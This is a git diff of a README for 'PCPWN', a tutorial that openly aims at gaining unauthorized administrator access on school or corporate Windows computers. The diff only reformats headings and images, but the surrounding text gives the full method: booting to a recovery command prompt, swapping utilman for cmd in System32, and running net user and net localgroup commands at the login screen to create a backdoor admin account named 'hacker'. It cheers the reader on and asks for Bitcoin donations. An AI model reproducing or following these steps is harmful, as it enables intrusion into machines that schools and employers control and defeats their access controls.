@@ -11,8 +11,8 @@
 </div>
 
 <h1 align="center"> [ PCPWN ]</h1>
-<h4 align="center">How can I obtain administrative privileges on a school computer
-</h4>
+<h3 align="center">How can I obtain administrative privileges on a school computer
+</h3>
 
 ### DESCRIPTION
 PCPWN is an informative tutorial that guides you through the process of gaining unauthorized access to administrative privileges on a computer within a school or corporate environment, all without relying on the pre-existing company-created admin account.
@@ -38,7 +38,7 @@ PCPWN is an informative tutorial that guides you through the process of gaining 
 
 Select "Repair Your Computer," then navigate to "Troubleshoot," and finally, select "Command Prompt."
 
-#### 2. Utilizing Command Prompt:
+### 2. Utilizing Command Prompt:
     In the Command Prompt, type notepad to open the Notepad text editor.
     select file | click save as | select this pc | select all files |
 
@@ -46,28 +46,24 @@ Select "Repair Your Computer," then navigate to "Troubleshoot," and finally, sel
 <a href="#"><img src="https://i.imgur.com/6QUeUIC.png" width="300"></a>
 <a href="#"><img src="https://i.imgur.com/xpSfUCj.png" width="300"></a>
 
-#### 3. Changing Utilman to CMD:
+### 3. Changing Utilman to CMD:
     Navigate to drive X (replace X with the appropriate drive).
     Go to System32 and rename cmd to utilman.
     Exit the Command Prompt.
 
-#### 4. Adding a User Account:
+### 4. Adding a User Account:
     Return to the login screen and click on "Ease of Access Icon."
     Type the following command: 
     net user hacker hacker /add 
     net localgroup Administrators hacker /add
 
 
-<td align="center">
-  <a href="#"><img src="https://i.imgur.com/Ebi9VG1.png" width="300" /></a>
-    <br />
-</td>
-<td align="center">
-  <a href="#"><img src="https://i.imgur.com/HiFXNMi.png" width="300" /></a>
-    <br />
-</td>
+<a href="#"><img src="https://i.imgur.com/Ebi9VG1.png" width="300"></a>
 
-#### 5. Logging In with the New Account with admin priv:
+<a href="#"><img src="https://i.imgur.com/HiFXNMi.png" width="300"></a>
+
+
+### 5. Logging In with the New Account with admin priv:
     Log in with your non-administrator account.
     Open PowerShell as an administrator.
     Type username: DOMAIN\hacker password: hacker
@@ -78,14 +74,14 @@ Guess what? You've got the keys to the kingdom now! Your regular account? Well, 
 With these admin superpowers, you can do a whole bunch of cool stuff. Need to tweak some settings? No problem. Want to add or manage users? Easy peasy. It's like having a backstage pass to the entire system. So go ahead, explore, and make this digital world yours!
 
 
-#### TESTED ON FOLLOWING
+### TESTED ON FOLLOWING
 * Windows 11
 * Windows 10
 * Windows 7
 
-#### Support
+### Support
 
-#### If you find my work helpful and want to support me, consider making a donation. Your contribution will help me continue working on open-source projects.
+### If you find my work helpful and want to support me, consider making a donation. Your contribution will help me continue working on open-source projects.
 
 **Bitcoin Address: `36ALguYpTgFF3RztL4h2uFb3cRMzQALAcm`**
    
